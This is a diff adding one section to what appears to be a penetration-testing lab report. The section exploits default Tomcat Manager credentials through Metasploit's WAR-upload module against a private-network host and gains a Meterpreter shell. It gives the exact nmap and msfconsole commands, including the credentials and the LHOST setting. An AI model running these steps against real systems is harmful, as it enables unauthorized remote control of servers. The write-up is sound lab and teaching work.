@@ -150,3 +150,30 @@ Key open ports found:
 - **Outcome / Impact:** Obtained unauthenticated root-level access to the target's MySQL server, exposing all databases.
 
  
+## Exploit 7: Apache Tomcat Manager Default Credentials — Malicious WAR Upload
+
+- **Service / Port:** HTTP (Tomcat) / 8180
+- **Vulnerability:** Apache Tomcat Manager application accessible with default credentials (tomcat:tomcat), allowing authenticated upload and deployment of a malicious WAR file
+- **Tool Used:** Metasploit — exploit/multi/http/tomcat_mgr_upload
+- **Why This Tool:** This vulnerability requires crafting a valid WAR file containing a payload, authenticating to the manager interface, uploading it, and triggering execution — a multi-step process Metasploit automates reliably via a purpose-built module rather than manual scripting.
+- **Steps:**
+  1. `nmap -p 8180 -sV 192.168.1.3` — confirmed Apache Tomcat/Coyote JSP engine
+  2. `msfconsole` → `search tomcat_mgr_upload`
+  3. `use 0` (exploit/multi/http/tomcat_mgr_upload)
+  4. `set RHOSTS 192.168.1.3`
+  5. `set RPORT 8180`
+  6. `set HttpUsername tomcat`
+  7. `set HttpPassword tomcat`
+  8. `set LHOST 192.168.1.4`
+  9. `exploit`
+  10. `getuid` / `sysinfo` to confirm access
+- **Evidence:** evidence/exploit7.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
+  - Reconnaissance: nmap identified Tomcat on port 8180.
+  - Weaponization: selecting the module and configuring credentials/target options paired the vulnerability with a working malicious WAR payload.
+  - Delivery/Exploitation: uploading and deploying the WAR file to the Tomcat manager triggered code execution on the server.
+  - Installation/C2: a Meterpreter session was opened, giving remote control of the target.
+  - Actions on Objectives: ran `getuid`/`sysinfo`, confirming access as the `tomcat55` service account and gathering system details.
+- **Outcome / Impact:** Obtained a Meterpreter session on the target running as the `tomcat55` service account, via authenticated malicious WAR deployment through Tomcat Manager.
+
+  
